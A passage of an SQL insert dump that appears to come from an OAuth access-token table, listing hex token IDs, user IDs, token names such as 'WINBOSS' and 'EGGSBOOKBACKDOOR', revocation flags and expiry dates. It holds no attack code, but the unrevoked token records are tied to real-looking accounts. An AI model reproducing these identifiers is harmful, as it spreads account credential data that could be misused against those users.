('93f4368d0b1490af787bb975563ce05a4b0cdafb5cdb0af250ecf685d454f4d4a391c6435d5ff391', '366593', 5, 'WINBOSS', '[]', 0, '2023-07-27 13:33:59', '2023-07-27 13:33:59', '2024-07-27 13:33:59'),
('9422ded83e4bfec0dca0f623ad574ef3927977f75295b5adf06cd6e862325aa82864ac52357327d3', '795025', 5, 'WINBOSS', '[]', 0, '2023-04-24 08:41:14', '2023-04-24 08:41:14', '2024-04-24 08:41:14'),
('94231e5a1edc46c5112a9dda6dea13a6a0a973919aefd8cc90507ff305535132575130adbc3440db', '294688', 5, 'WINBOSS', '[]', 0, '2024-01-09 01:49:00', '2024-01-09 01:49:00', '2025-01-09 01:49:00'),
('944bbf9c79347952bf08b4fccc737380325f623db2cb0794f502c842ac064886720f1953dc470646', '504769', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:34:25', '2022-12-25 23:34:25', '2023-12-25 23:34:25'),
('948e46eab320f8353210dbc6078b11ab6968931956b222bed5752b60b831f1bb5c9a9585c90691c0', '518269', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-04-12 08:41:21', '2023-04-12 08:41:21', '2024-04-12 08:41:21'),
('9490b474cafe6aaf912c0440bf2b8ea94267fce34b63fbd72fd9822c591abf312514fb2782965f69', '762338', 5, 'WINBOSS', '[]', 0, '2023-05-14 06:37:24', '2023-05-14 06:37:24', '2024-05-14 06:37:24'),
('949618061ba215fcf7ee50f851066bc8f2991b203df0c81a0b2e7b2570d8dfa3d137ffd9ccd1a7db', '204692', 5, 'WINBOSS', '[]', 0, '2023-12-19 17:05:24', '2023-12-19 17:05:24', '2024-12-19 17:05:24'),
('94d0c972a248300c795338c9bdcc9e98aeda318824452b4d85c5f9211e391fa848a639c102bee571', '732778', 5, 'WINBOSS', '[]', 0, '2022-10-01 10:51:12', '2022-10-01 10:51:12', '2023-10-01 10:51:12'),
('95002846addd7ecfe8969966b8e710c7abc8a7fda34b1fd726ccbe2fdc8d04c3d1e79d13c272080e', '990864', 5, 'WINBOSS', '[]', 0, '2023-03-10 08:51:15', '2023-03-10 08:51:15', '2024-03-10 08:51:15'),
('9519694c80cec519d5a20ae8666f649d0a3c14badde52fe33d07bc182cca79e12c1847e31eb36ec5', '644271', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-03-29 08:47:37', '2023-03-29 08:47:37', '2024-03-29 08:47:37'),
('956cd26df1a609dc3450c135bfabe7a38200d534d68bfea8a1de47a1ad46713e4efc657bf199f67b', '696103', 5, 'BeTNoW', '[]', 0, '2023-02-03 03:00:12', '2023-02-03 03:00:12', '2024-02-03 03:00:12'),
('95b26ae7faaa3c48569b3c8873dd8eb53aa8967196f6fd7b615d92114a69a6fc874ace53da3e5354', '508635', 5, 'WINBOSS', '[]', 0, '2023-03-19 07:32:20', '2023-03-19 07:32:20', '2024-03-19 07:32:20'),
('961395e91a9273cfaf19fd43ea69a6aefbfee74c853a40ea14e9de08f9a026ace8f700f625e099a6', '590227', 5, 'WINBOSS', '[]', 0, '2023-02-02 11:04:57', '2023-02-02 11:04:57', '2024-02-02 11:04:57'),
('96347e8c4550b5c0cdf56454ffdd1a4d2a1f6d86fd925211c9027188e09952f754325406a9e99f49', '626061', 5, 'WINBOSS', '[]', 0, '2022-10-28 05:34:39', '2022-10-28 05:34:39', '2023-10-28 05:34:39'),
('96410ff62bff32361669001a6871f70652e2097fca46b25eb3ce9877ded05bb455783fd3df64f796', '605638', 5, 'BeTNoW', '[]', 0, '2023-06-02 03:54:31', '2023-06-02 03:54:31', '2024-06-02 03:54:31'),
('965ce340a62dc303be5c41278efbe57140f54b40e120db557d2244105162e91e68de3cf10ee3576b', '801479', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-04-03 03:23:32', '2023-04-03 03:23:32', '2024-04-03 03:23:32'),
('966289985684be4bef9444855416f949cf3b4e91d4c68ad5cb172313f42df55b46a7e26f389bc14a', '392957', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:37:18', '2022-12-17 10:37:18', '2023-12-17 10:37:18'),
('96e91038baa189d5f944a7a2095d3b2028ea97aca3ebea1b1069ca09e7e567a478ec8162d4c079c8', '440965', 5, 'WINBOSS', '[]', 0, '2023-07-15 05:50:51', '2023-07-15 05:50:51', '2024-07-15 05:50:51'),
('96fdac6238c64ef2a233151bcb397c4cf98496b7bc6c9fe349e31821ff3c6cf3174913644885c6ea', '310848', 5, 'WINBOSS', '[]', 0, '2023-05-18 11:38:44', '2023-05-18 11:38:44', '2024-05-18 11:38:44'),
('97051aa82f652c359a7dd00fb5c5035c335495f4afb028ded6fcf01da98a38d6ef64965d096bd4ab', '296967', 5, 'WINBOSS', '[]', 0, '2024-01-14 01:29:28', '2024-01-14 01:29:28', '2025-01-14 01:29:28'),
('970a0c6c17b382035615dcf31adea503e7b1c4fb0938033d15ca87d7bdabf6a14d023c29225458f1', '323075', 5, 'WINBOSS', '[]', 0, '2023-06-23 07:26:52', '2023-06-23 07:26:52', '2024-06-23 07:26:52'),
('970d57b3f3076589f38afa4adba3eb0984b9c9ef6b448dc4ba8d1166957699d3917481d8a5553279', '636618', 5, 'WINBOSS', '[]', 0, '2022-08-23 10:07:24', '2022-08-23 10:07:24', '2023-08-23 10:07:24'),
('9730c9bc1a970460b8c5a8daa70dfb3206c74e3a1f2fcd9c10a4c6350b34aea03a95db5ef1da17db', '890739', 5, 'WINBOSS', '[]', 0, '2023-07-30 03:00:26', '2023-07-30 03:00:26', '2024-07-30 03:00:26'),
('976d6505dbe2b431f6c646ddeb829eb6bfea392f97d7d8ec9d3ddbbcf1c902cbdf148cb5dfe003f1', '260752', 5, 'WINBOSS', '[]', 0, '2022-12-08 12:15:03', '2022-12-08 12:15:03', '2023-12-08 12:15:03'),
('977e6bd20b45d3df3873ec07655046229bf3bf155e5a69f41701014341052011dda45a6b449bb47d', '383175', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:39:47', '2022-09-01 05:39:47', '2023-09-01 05:39:47'),
('978956703ee670141dcf987a4c989fe78acc29940ddacbcf8bb8d23fe944cef27b4ac9a0ae0ab346', '809247', 5, 'WINBOSS', '[]', 0, '2023-02-28 14:36:33', '2023-02-28 14:36:33', '2024-02-28 14:36:33'),
('983109b2c67e01bf774cb9ae5a31060140ff32ec345c1a7fc5d0f2617be3581705997b06752ea450', '800771', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:27:30', '2022-12-07 14:27:30', '2023-12-07 14:27:30'),
('9847b17cef11217fdb7cfe87acfc3c6f488e68ec33597eeb3ace99a197fb781bc8401ffcf20cc245', '404441', 5, 'WINBOSS', '[]', 0, '2023-05-15 04:33:38', '2023-05-15 04:33:38', '2024-05-15 04:33:38'),
('9876216bbd7b093bffc14d906328e0a570fa20745165e19720a180ed6be31a56a1446ccffe909eba', '430521', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:28:05', '2024-01-22 04:28:05', '2025-01-22 04:28:05'),
('98841b94f4079a45c2ae6d535382d38d3676a089ec874805935209669f09c9c58983a384849d6300', '124807', 5, 'WINBOSS', '[]', 0, '2023-11-08 02:31:58', '2023-11-08 02:31:58', '2024-11-08 02:31:58'),
('9892279c4940a3b4ddd5072758b30fd4f9575d1eaad13f00a453c1610bed7936d508ac2c9585c86d', '652579', 5, 'WINBOSS', '[]', 0, '2023-05-01 07:25:26', '2023-05-01 07:25:26', '2024-05-01 07:25:26'),
('98e73bd2dcad4764bdde27c6d7061a4369d4d152f20737373b6d5fec235ddd5b422177f07ab44217', '140135', 5, 'WINBOSS', '[]', 0, '2023-09-15 06:41:13', '2023-09-15 06:41:13', '2024-09-15 06:41:13'),
('9921f1a75cf27ab7d9b7f7f3355478f7d1021901116fbcd2c959dee2db5d46d3c1f8e6652821137f', '999870', 5, 'WINBOSS', '[]', 0, '2023-10-09 10:59:34', '2023-10-09 10:59:34', '2024-10-09 10:59:34'),
('995ea72fa253596f9e96c09bbbce5ad1b5d809c3ececffbcb5f05f5c51002c34a0bdad6d9aefd6b9', '328584', 5, 'WINBOSS', '[]', 0, '2022-08-23 10:29:52', '2022-08-23 10:29:52', '2023-08-23 10:29:52'),
('99b146e9d006bb23400cd85536f171f0f3cf6cccac9406ade2df070e11bf20c1faf57f1c885b6672', '514501', 5, 'WINBOSS', '[]', 0, '2022-06-30 13:31:12', '2022-06-30 13:31:12', '2023-06-30 13:31:12'),
('99d05c6fb49cd57efc3f335b4548e6f97b0edfb3d93c2842087f96547b57aa21e746b2da3501b5ec', '464138', 5, 'WINBOSS', '[]', 0, '2022-11-07 09:25:38', '2022-11-07 09:25:38', '2023-11-07 09:25:38'),
('99e156defc106b6027f324ec3b0ec05ca5b763ed41a9b298bdc1d032286bbe62c9f18cc820fba79e', '822368', 5, 'WINBOSS', '[]', 0, '2023-04-17 11:15:40', '2023-04-17 11:15:40', '2024-04-17 11:15:40'),
('99e2354ae833342daf84944ce4e17625b883818d0616e6a4a065eaaefed9174851761f8ceeb44172', '179160', 5, 'WINBOSS', '[]', 0, '2024-01-10 11:19:16', '2024-01-10 11:19:16', '2025-01-10 11:19:16'),
('99e7c0c0d4e46de00e0f5c991a5f9722036ab404ac0ded4ee4f7b86812a4e3716b0cd2be8aff62f7', '636598', 5, 'WINBOSS', '[]', 0, '2023-03-21 03:04:03', '2023-03-21 03:04:03', '2024-03-21 03:04:03'),
('9a168abea202dacd10216d06741014cd8bca158de49ad5b1385981be2d9ebc3e7d6a8bcc75301f0e', '617977', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:25:34', '2022-12-25 23:25:34', '2023-12-25 23:25:34'),
('9a933c1388f8dd1bedf8015596955889a5de1d4b832c7f26daf37ea750e33a1b14f3f677d24bc9e3', '678500', 5, 'WINBOSS', '[]', 0, '2022-12-27 20:51:37', '2022-12-27 20:51:37', '2023-12-27 20:51:37'),
('9ab3ec0135ddc8764e7d4a86ff7882450a54046846af021a88eea4a484311afb49f4299ef63bcf57', '729990', 5, 'WINBOSS', '[]', 0, '2023-01-22 14:22:58', '2023-01-22 14:22:58', '2024-01-22 14:22:58'),
('9ae452578489041055fa92ff2309fc2d5de3d30b176d47f854e7d4428e3b8c65b64a3487617f49fb', '821075', 5, 'WINBOSS', '[]', 0, '2023-12-31 12:22:18', '2023-12-31 12:22:18', '2024-12-31 12:22:18'),
('9af333919a0349dba4d9fd11afdc724748f92395e0f6048f271966625e3d99225cb1427d063e9cfc', '452756', 5, 'WINBOSS', '[]', 0, '2022-12-05 10:06:56', '2022-12-05 10:06:56', '2023-12-05 10:06:56'),
('9b06fd23623fd8337d17ff8251248b5be757f28ca32b76a4d23c8b5e6e7eb59a7a4e0debf2a25f46', '232949', 5, 'WINBOSS', '[]', 0, '2023-04-18 08:53:38', '2023-04-18 08:53:38', '2024-04-18 08:53:38'),
('9b074fa1257d13ac72cd86129acc9ecbc37e4a16c3bd11d833bfec8ddc5cdd45f017909b3083d8b1', '920277', 5, 'WINBOSS', '[]', 0, '2023-06-21 10:04:04', '2023-06-21 10:04:04', '2024-06-21 10:04:04'),
('9b832951a6ceda975a8910145d2e9f58feec4a2d5463e4f0889bcd026a40cd9a37ae096f49e85c93', '680138', 5, 'WINBOSS', '[]', 0, '2023-01-20 16:41:57', '2023-01-20 16:41:57', '2024-01-20 16:41:57'),
('9b83aeb2aea6b200a1adb8bb396aea85cafbd841a76b5225edcb74675db169c1a572c6a8d3c7e0f5', '992112', 5, 'WINBOSS', '[]', 0, '2022-12-30 21:17:48', '2022-12-30 21:17:48', '2023-12-30 21:17:48'),
('9b8ecf2a78488cc8ea6df1a5ce45d42fa1d47bae695147b60fe2cd14730539503e1d8da79784b9d7', '402635', 5, 'WINBOSS', '[]', 0, '2023-05-08 05:45:03', '2023-05-08 05:45:03', '2024-05-08 05:45:03'),
('9bd358d7d2531e5afd88b65b7926fa0048969426af83d22b62392cf462c77f6a26717e8185e1b967', '144073', 5, 'WINBOSS', '[]', 0, '2023-03-21 10:11:12', '2023-03-21 10:11:12', '2024-03-21 10:11:12'),
('9bff713c9523e4e95fa3ae8d75d9fc60fb2a8f4bc7766317b33135e33e5b8fb57ab56d7743fb1807', '675916', 5, 'WINBOSS', '[]', 0, '2022-12-28 19:31:26', '2022-12-28 19:31:26', '2023-12-28 19:31:26'),
('9c1cc54c0e03db261a58002a933565efec049f0aea63c790379705629382f67f91c0cf9725d08fa5', '694947', 5, 'WINBOSS', '[]', 0, '2023-10-22 10:03:12', '2023-10-22 10:03:12', '2024-10-22 10:03:12'),
('9c28ac3ddf086bc6df62e60f47f7d08d1d8e690479e353df66ad019e1f5a2f03d1011fa09ef879d2', '357443', 5, 'WINBOSS', '[]', 0, '2023-12-29 02:32:28', '2023-12-29 02:32:28', '2024-12-29 02:32:28'),
('9c2effbca9eb047adf26bd2ca84174a6287a6b62e3160f4feafa721c855f7551ec8ae80999d285b0', '111069', 5, 'WINBOSS', '[]', 0, '2023-07-23 18:38:16', '2023-07-23 18:38:16', '2024-07-23 18:38:16'),
('9cb52f10225f3ef4e199247370cd24215a1dba78824ef6e76fc204cf64a5301a1be9e69cc7a982a5', '439618', 5, 'WINBOSS', '[]', 0, '2023-08-22 05:17:04', '2023-08-22 05:17:04', '2024-08-22 05:17:04'),
('9cc1d679cd28b06ce298a79f01c166907d98a9d547b483572cfeadf798df55537cd27785ba924001', '367906', 5, 'BeTNoW', '[]', 0, '2022-11-25 03:27:45', '2022-11-25 03:27:45', '2023-11-25 03:27:45'),
('9cd00ebaabf58f92e0eafde37ca0e281e4278c90d747b733df079636b49dfd7325ddfa5a40aad612', '322158', 5, 'WINBOSS', '[]', 0, '2023-01-17 11:31:55', '2023-01-17 11:31:55', '2024-01-17 11:31:55'),
('9cef7f88cc386dc4c5e325b84b22fbadf23d29ad41d8467b429cdeab14708a8445841c832e6aa589', '772838', 5, 'WINBOSS', '[]', 0, '2023-11-26 13:26:46', '2023-11-26 13:26:46', '2024-11-26 13:26:46'),
('9cfb6896e4b4545fe426db6461b426ab56fa5545ac023de7ac89fc2924982b914b0056aaa5edaa4c', '794550', 5, 'WINBOSS', '[]', 0, '2023-01-18 14:54:12', '2023-01-18 14:54:12', '2024-01-18 14:54:12'),
('9d4dce8edc265e84b28f6a6ea40e819831707e7ddf173f5e6b97a2e31dee715270ce336357faefaa', '573035', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:15:43', '2022-06-28 08:15:43', '2023-06-28 08:15:43'),
('9e27da6e1a4977ee40babd9f8b1f83e200c25a1850fa4fedcdb65cf4f564d9f58e32bfac2e7c6f00', '663622', 5, 'WINBOSS', '[]', 0, '2022-09-16 02:59:04', '2022-09-16 02:59:04', '2023-09-16 02:59:04'),
('9e5bd631bc99a0679bcb8f7a5b21a543c56ac003bd7c10845a408e8b59fb0f6412d290621075aab4', '122826', 5, 'WINBOSS', '[]', 0, '2022-09-26 11:47:18', '2022-09-26 11:47:18', '2023-09-26 11:47:18'),
('9e82330fc944d12c4ff5e6bcfe60fedc42ce59823b87d44c9261da99a6170cd411c727d27bcfd843', '307041', 5, 'WINBOSS', '[]', 0, '2022-06-29 14:19:25', '2022-06-29 14:19:25', '2023-06-29 14:19:25'),
('9e96b104f85b808e1090775a88d8b21c3af4f02683ab6b5c06854d8a0651b0009ed93e10bcb7e9dd', '226476', 5, 'WINBOSS', '[]', 0, '2022-12-27 09:00:48', '2022-12-27 09:00:48', '2023-12-27 09:00:48'),
('9e977f05a43a9c720c22bf4fad554877fb5d256edfbb1fa80c4d49bccb4dbc348aaa7f3e84fd0fc5', '926546', 5, 'WINBOSS', '[]', 0, '2022-12-10 08:22:43', '2022-12-10 08:22:43', '2023-12-10 08:22:43'),
('9f2b50a76d8a2705404e31aad3451e918764a2d9cd9da1ac75cbf01b5f357e0aa8576f172b989fc9', '168532', 5, 'WINBOSS', '[]', 0, '2023-07-27 08:11:11', '2023-07-27 08:11:11', '2024-07-27 08:11:11'),
('9f3b9d298fa6efef1e4cea4184e3b7130a8fcb5cb14b7f0c3858869610db22246f7316562760f8aa', '511037', 5, 'WINBOSS', '[]', 0, '2022-12-27 20:49:58', '2022-12-27 20:49:58', '2023-12-27 20:49:58'),
('9f6f9c9dcb78c7d0d52e38699004ec867a927916ed566b34dd30ebfda30297920d3530f1cec55de5', '734070', 5, 'WINBOSS', '[]', 0, '2022-12-08 12:23:11', '2022-12-08 12:23:11', '2023-12-08 12:23:11'),
('9f7ccec2688ada0afa7a345e34914f729d96b6ffefd5458aadf508438def9b9d872806a433368686', '238132', 5, 'WINBOSS', '[]', 0, '2023-04-05 12:16:37', '2023-04-05 12:16:37', '2024-04-05 12:16:37'),
('9f8039035132d560698fee1a351a3a64d2daf7ad8a59e378905c6a57e0fa35e90990a865296d206f', '828376', 5, 'WINBOSS', '[]', 0, '2022-12-12 04:36:23', '2022-12-12 04:36:23', '2023-12-12 04:36:23'),
('9fd2c4794c1eae4eec27df85f8f47657bf9236fb8f7341eb6ff80f4954c4d272d7b84ca4e2d63348', '845544', 5, 'WINBOSS', '[]', 0, '2024-01-14 07:47:43', '2024-01-14 07:47:43', '2025-01-14 07:47:43'),
('a022e643843e233927e50b55e0da76044fe0f5a84bbc4e815547b293717a972a2625f16984e1d7ee', '138752', 5, 'WINBOSS', '[]', 0, '2024-01-15 02:09:34', '2024-01-15 02:09:34', '2025-01-15 02:09:34'),
('a03e9eb5d860d9045749bbd1d35ebb4dd96eb4371a9415978d6c657305f83e6ef9ad88eb22a5c0c9', '370418', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:49:56', '2022-12-25 23:49:56', '2023-12-25 23:49:56'),
('a052cd45961a081e6b3e4504e02a17228d1646225f611ee0a51a1d8176bce552d0c6502c8d78f381', '983669', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:51:20', '2024-01-22 04:51:20', '2025-01-22 04:51:20'),
('a0f0c16ffbc3369f0023f34c5af40d6d10dd5b19be4df016b86e2c1b75eb1ce809eb492b39bfd7b3', '429983', 5, 'WINBOSS', '[]', 0, '2023-11-28 12:56:52', '2023-11-28 12:56:52', '2024-11-28 12:56:52'),
('a12b455661280b364b7cbaacbdaa659588db8d987d67fd9cb4ee0ed35b3feb7cc338b515feb44088', '744152', 5, 'BeTNoW', '[]', 0, '2022-08-04 03:00:45', '2022-08-04 03:00:45', '2023-08-04 03:00:45'),
('a1581f144cab7b0d6e80d1a556b31f2af3349038e9f4a92034f7cd0473b4812179afdc9d1f06f4d7', '715725', 5, 'WINBOSS', '[]', 0, '2023-01-02 19:25:20', '2023-01-02 19:25:20', '2024-01-02 19:25:20'),
('a17725989bcd7753395ef9c2f5689885752968c9166394fa84d16cf595f7218b8833d60118d9fd01', '744773', 5, 'WINBOSS', '[]', 0, '2024-01-18 06:59:45', '2024-01-18 06:59:45', '2025-01-18 06:59:45'),
('a1786c38dac0fd34c0745aac7a70aed2fb142d564ed24b16bcfd051d88fb9b02c316eb879bf2d9f1', '262733', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:27:09', '2024-01-22 04:27:09', '2025-01-22 04:27:09'),
('a1a07ed309cafb4eb9ead824dde70de5dc0145ac663b5f48d311974ef2040dfd48a1ee31546b091b', '975846', 5, 'BeTNoW', '[]', 0, '2022-12-02 03:03:03', '2022-12-02 03:03:03', '2023-12-02 03:03:03'),
('a1af8044b2bdb377d4cf9671c3c4cd341cf134b57c43f7b2f8679383c7ff4e47094d5001271c95bf', '449720', 5, 'WINBOSS', '[]', 0, '2023-11-05 07:11:20', '2023-11-05 07:11:20', '2024-11-05 07:11:20'),
('a1e5f1173340d18ab05875e01299d94adef20030c307b9d19422ba691a621e468530d31e6a487ece', '292806', 5, 'WINBOSS', '[]', 0, '2022-12-27 21:02:43', '2022-12-27 21:02:43', '2023-12-27 21:02:43'),
('a2085d003ed374eaeb5b1a236eba972dd06242b7242fcd20dfd667dbb5d0400221b58a2743affa2d', '204543', 5, 'WINBOSS', '[]', 0, '2023-01-27 08:21:35', '2023-01-27 08:21:35', '2024-01-27 08:21:35'),
('a2575ea1d11f6d925a1a639ffd6e81896d5c83139483ca1c0750b15974fc3eec328b290118c1006f', '399149', 5, 'WINBOSS', '[]', 0, '2023-04-07 09:02:14', '2023-04-07 09:02:14', '2024-04-07 09:02:14'),
('a268704ebcc4878e2ea56a8f5618bea45058a90cdb918840484c4112f6756693cb98f2ac3476d09d', '163658', 5, 'WINBOSS', '[]', 0, '2023-08-13 19:45:43', '2023-08-13 19:45:43', '2024-08-13 19:45:43'),
('a287da351a45502083df550b105c34943ded335fdc6b99e39297812740299d739fe176a011b32ef0', '742469', 5, 'WINBOSS', '[]', 0, '2023-06-20 02:48:19', '2023-06-20 02:48:19', '2024-06-20 02:48:19'),
('a2978965d26a1db1fa7158b90fa8d9d3c798cef48a5e31321c4f1bf247ab42e3ae96e90a8dca80ad', '270689', 5, 'WINBOSS', '[]', 0, '2023-11-19 00:58:46', '2023-11-19 00:58:46', '2024-11-19 00:58:46'),
('a2a98be0b2be579c906745902354bd132295a19331b624edc12063306704433cf41fa43e01cc51b5', '367905', 5, 'WINBOSS', '[]', 0, '2022-12-30 22:05:06', '2022-12-30 22:05:06', '2023-12-30 22:05:06'),
('a2b3f5576a1d33a0ff4d82655fa65fea746ec79f7a4d5ea6e9005b1ca4c0ae2870e58da8de3a3658', '920591', 5, 'WINBOSS', '[]', 0, '2023-12-29 02:32:53', '2023-12-29 02:32:53', '2024-12-29 02:32:53'),
('a2bb0da02a4b37401ed76e97b315120ad87e7688e666f917d51b2d52f9fff494d58b3fbb4645512f', '776094', 5, 'WINBOSS', '[]', 0, '2023-08-25 09:33:11', '2023-08-25 09:33:11', '2024-08-25 09:33:11'),
('a32d1e5545a487ededa26670b317d3f42cf4e64d96002bf5167eaf05636b0907b840bae7dbe9e032', '961959', 5, 'WINBOSS', '[]', 0, '2022-12-08 04:43:42', '2022-12-08 04:43:42', '2023-12-08 04:43:42'),
('a34d7bfd8294f3da17b022ace123725af732c743db9e963109bcc88cf5ab9b169a465b446376543b', '881285', 5, 'WINBOSS', '[]', 0, '2023-07-15 05:48:32', '2023-07-15 05:48:32', '2024-07-15 05:48:32'),
('a37c46a71ab29cb24d1014bc2cfa55df80ee93eea8df102cdaada66568cbf472781dd211c0967bd3', '209078', 5, 'WINBOSS', '[]', 0, '2024-01-15 02:10:24', '2024-01-15 02:10:24', '2025-01-15 02:10:24'),
('a4133fc70dc33a38d6e483f2ca8e900d5618376dc8019cdf1411b5459eb99489fd1b1927d0b9b4be', '200242', 5, 'WINBOSS', '[]', 0, '2023-04-03 04:32:21', '2023-04-03 04:32:21', '2024-04-03 04:32:21'),
('a42935c790786100cf6573e5ea67235bf8ce3cc36a4f5770fa672a83d4c08e6fbc675dadb5fdfa76', '822484', 5, 'WINBOSS', '[]', 0, '2024-01-18 07:26:10', '2024-01-18 07:26:10', '2025-01-18 07:26:10'),
('a4b998c7fa6809f96a206148288ce087e872ed31ea983e67bda9fa2f5ba3afcd3d603876eeb0853e', '719671', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:39:11', '2022-12-25 22:39:11', '2023-12-25 22:39:11'),
('a4d79ca6567ab26ab74c2079e60749d698e9ef92e961c80ee6eb905760a606d51e891fd739d9def4', '545952', 5, 'BeTNoW', '[]', 0, '2022-08-18 05:05:10', '2022-08-18 05:05:10', '2023-08-18 05:05:10'),
('a4f52558a1fc495bc13430c40e03539176b2d762a367d67f61d937721186abc34856976a2e3f9103', '738231', 5, 'WINBOSS', '[]', 0, '2023-10-26 09:27:07', '2023-10-26 09:27:07', '2024-10-26 09:27:07'),
('a51b603df3c9788621e28bb3a0ed814f8fffe7200b74d9e82f1a250abcd5381c92c6f4d96b338c10', '352020', 5, 'WINBOSS', '[]', 0, '2022-12-08 07:47:32', '2022-12-08 07:47:32', '2023-12-08 07:47:32'),
('a51fd531b8002c1fbcbd2c3f615f103d8dea66a0b5394578ab69731cc8e06afe88cb76ba978162de', '358575', 5, 'WINBOSS', '[]', 0, '2022-12-19 01:22:56', '2022-12-19 01:22:56', '2023-12-19 01:22:56'),
('a55589fc9574b10511a9d7539483104b66c4a877676d06eb6ca215fe6df1354aba4092c236a198d0', '814180', 5, 'WINBOSS', '[]', 0, '2024-01-14 05:31:25', '2024-01-14 05:31:25', '2025-01-14 05:31:25'),
('a558c67fd975a4736f13aa9fc8fa6697a1de8be35d2fac38450a86e2a480eac1fe415ef208d49350', '550870', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:18:30', '2022-12-10 13:18:30', '2023-12-10 13:18:30'),
('a5adff200df849835c5bf4d299b1b14087867c9c13be0314e20be3df76d835e722af3a25fb24f74f', '666395', 5, 'WINBOSS', '[]', 0, '2022-12-10 15:38:09', '2022-12-10 15:38:09', '2023-12-10 15:38:09'),
('a5de06825cc578b9aaf55e5a74e0b78980cf9e6ae2e43f14e4a49bfc37f2e3c0b39b6a5f71333a59', '708151', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:24:08', '2022-06-28 08:24:08', '2023-06-28 08:24:08'),
('a61b1ef038e5e4201ccc6ef3aedb8eef9c6e3bee0194b8d8e4ad73b7cf8ed8f6e413fba3b285124f', '713191', 5, 'WINBOSS', '[]', 0, '2023-04-28 15:58:50', '2023-04-28 15:58:50', '2024-04-28 15:58:50'),
('a6817aceda27b6f0bcfaa15d19dd5e6386ab6c8a491af6f8c41dc0f4edd02196a4fa98049cec560a', '657860', 5, 'WINBOSS', '[]', 0, '2022-09-18 03:44:01', '2022-09-18 03:44:01', '2023-09-18 03:44:01'),
('a68f5558a3631c5dc28d758bd1259c90776753c80810fa667aab114238c0a18c098df04a101cfdcf', '294820', 5, 'WINBOSS', '[]', 0, '2023-08-15 09:00:47', '2023-08-15 09:00:47', '2024-08-15 09:00:47'),
('a6bc0a7ed4f882c8fd06d74262b46e3c0eba0a4419b0803f98f4b1a13d3d031219e40eb7f48485b1', '560136', 5, 'WINBOSS', '[]', 0, '2023-01-01 13:12:04', '2023-01-01 13:12:04', '2024-01-01 13:12:04'),
('a70f6c1cb74e50453b473de5ee6422e6f4a1313f79bc1d3c394eaff7521f00e9dd27dbeada7de1ad', '659100', 5, 'WINBOSS', '[]', 0, '2023-04-26 12:53:07', '2023-04-26 12:53:07', '2024-04-26 12:53:07'),
('a7247d354260acd5e252e302827807363fc4659ef41e1dd4f362b5a037a562a19ede6d018eb95450', '194716', 5, 'WINBOSS', '[]', 0, '2023-11-06 02:15:57', '2023-11-06 02:15:57', '2024-11-06 02:15:57'),
('a72e7f9a5a33fa84cbc71016318c72ed7622cdff48e639971ab9695435c2b680000b7c916e939ca0', '630178', 5, 'WINBOSS', '[]', 0, '2024-01-21 11:12:13', '2024-01-21 11:12:13', '2025-01-21 11:12:13'),
('a737ee30aba6cfe402857503e11c430dff4d176a95c1b62e5a388c74c0e32a00a9ef86474aa80f8a', '329185', 5, 'WINBOSS', '[]', 0, '2023-07-28 18:32:05', '2023-07-28 18:32:05', '2024-07-28 18:32:05'),
('a772ce6d0644e294a980c7d742dc2a199ac2f491d631bf33c5fa382e2cdf48640c79fb29b446f42b', '386125', 5, 'WINBOSS', '[]', 0, '2023-01-17 16:48:47', '2023-01-17 16:48:47', '2024-01-17 16:48:47'),
('a7730fb6cd363667bc0ce31ab4356be4cc264586ffe68489d0ba3b41b9a807c3375054b18573e707', '403718', 5, 'WINBOSS', '[]', 0, '2023-05-09 08:17:18', '2023-05-09 08:17:18', '2024-05-09 08:17:18'),
('a7c1fc0297f04384662ea323afd0ba35413ba02f357a6f5a42c5875338652ce73b582b50734f564b', '690222', 5, 'WINBOSS', '[]', 0, '2022-12-10 16:38:45', '2022-12-10 16:38:45', '2023-12-10 16:38:45'),
('a7e7f1af828bff8f0e9e929adbfa322e48cc29f263fabd8e3c3c7f7c93bd77a93c455fcf1bd43de6', '614513', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:15:37', '2022-12-25 21:15:37', '2023-12-25 21:15:37'),
('a7f3dc22378bbb7947e4f642e960d1a9a6d11cc3950f019183ddeaaed33d6ee7fccdd3b057d9fdf7', '303351', 5, 'WINBOSS', '[]', 0, '2022-12-30 21:52:43', '2022-12-30 21:52:43', '2023-12-30 21:52:43'),
('a7f716f5d5b86e07efca88e0ea89cba983def43b0a17385cd368a7bd58a812b94edef8243193c98e', '769900', 5, 'WINBOSS', '[]', 0, '2023-06-10 02:08:57', '2023-06-10 02:08:57', '2024-06-10 02:08:57'),
('a826806bbbe3da39a732e2a30aaea2cf60f09f0563fd971beeac299cd5c76a1be2b34b08ba96a13a', '231989', 5, 'WINBOSS', '[]', 0, '2023-07-06 06:57:01', '2023-07-06 06:57:01', '2024-07-06 06:57:01'),
('a8278645549f8a7cfe1f71db33f6a00e9c7543fa696309579a152a4d68356e81d5fb82601c566061', '670098', 5, 'WINBOSS', '[]', 0, '2023-11-30 05:22:26', '2023-11-30 05:22:26', '2024-11-30 05:22:26'),
('a82af5091650ccf7e36241c87c72f403f66b2557e3ef73cd485ccb0a93e6f553068431b6e612944e', '501126', 5, 'WINBOSS', '[]', 0, '2022-11-30 08:51:55', '2022-11-30 08:51:55', '2023-11-30 08:51:55'),
('a831e2e80af8e7afb70617503699cadf3499199cefc0b1717476156fc874706607f629644223efba', '563362', 5, 'WINBOSS', '[]', 0, '2022-12-26 13:21:23', '2022-12-26 13:21:23', '2023-12-26 13:21:23'),
('a8457b4b339e6071227a9b25ef2db537f9caa3815689f14df3f559eb2688c776ba989dd77baf36f5', '418373', 5, 'WINBOSS', '[]', 0, '2023-04-17 09:56:34', '2023-04-17 09:56:34', '2024-04-17 09:56:34'),
